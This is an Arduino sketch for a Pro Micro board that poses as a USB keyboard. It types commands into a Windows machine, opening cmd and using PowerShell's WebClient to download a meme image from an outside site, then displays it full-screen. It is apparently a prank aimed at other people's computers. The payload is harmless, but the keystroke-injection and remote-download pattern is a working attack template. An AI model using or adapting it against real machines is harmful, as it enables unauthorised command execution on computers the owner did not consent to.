// USB KEYHACK
// Insert Lenovo/ProMicro into USB port, wait for green light to blink (a generic USB keyboard driver is quickly instelled at this point)
// Press button to download image, open it in default viewer & display it full-screen
// Unplug the USB & run! :D

int buttonPin = 10;  // Button on pin 10 (connects to GND)

void setup()
{
  pinMode(buttonPin, INPUT);  // Set the button as an input
  digitalWrite(buttonPin, HIGH);  // Pull the button high
  Serial.begin(9600); // Allow printing to the serial monitor for debugging
}

void loop()
{
  TXLED1; // Green LED flashes to signify readyness
  delay(250);
 
  if (digitalRead(buttonPin) == 0)
  {
    RXLED1; // Turn on orange LED while the device is sending instructions
    
    Serial.println("Open Start menu");
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_ESC);
    delay(250);
    Keyboard.releaseAll();
    
    delay(750);

    Serial.println("Open command prompt");
    Keyboard.println("cmd");
    delay(1500);

    // The image will be saved in a newly created 'bk' folder so that the full-screen image viewer doesn't slideshow 
    // through all the images on the Desktop & ruin the 'effect'.
    Serial.println("Make directory");
    Keyboard.println("cd Desktop");
    Keyboard.println("md bk");
    delay(250);

    Serial.println("Download image");
    // The pro micro seems to appear as a US keyboard and so @ = " and vice-versa
    //Keyboard.println("powershell -command @& { iwr http://www.quickmeme.com/img/e0/e08438c84e36715ed30df393db08392ab9deefd0b7fb1d9ebaade9e549b18314.jpg -OutFile 'Desktop/image.jpg' }@");
    
    // iwr wasn't introduced until Powershell v3.0 (my targets have v2.0) so use the old New-Object method to download the image:
    Keyboard.println("powershell");
    delay(500);
    Keyboard.println("$WebClient = New-Object System.Net.WebClient");
    delay(200);
    Keyboard.println("$WebClient.DownloadFile('http://www.quickmeme.com/img/e0/e08438c84e36715ed30df393db08392ab9deefd0b7fb1d9ebaade9e549b18314.jpg','bk/image.jpg')");
    
    delay(5000); // Wait for download to complete
    Keyboard.println("exit"); // Exit powershell
    delay(500);

    
    Serial.println("Open image");
    Keyboard.println("cd bk"); // Navigate to the image's location
    Keyboard.println("image.jpg");

    delay(1000); // Wait for default image viewer to launch

    Serial.println("Display full-screen");
    Keyboard.press(KEY_F11);
    delay(250);
    Keyboard.releaseAll();
    
    RXLED0; // Turn off orange LED when the device is done sending instructions
  }

  TXLED0; // Green LED flashes to signify readyness
  delay(250);
}

// Keyboard.write sends a single character
// .print sends a series of characters
// .println sends a series of characters followed by a carriage return
// .press holds a button
// .releaseAll is self-explanatory...
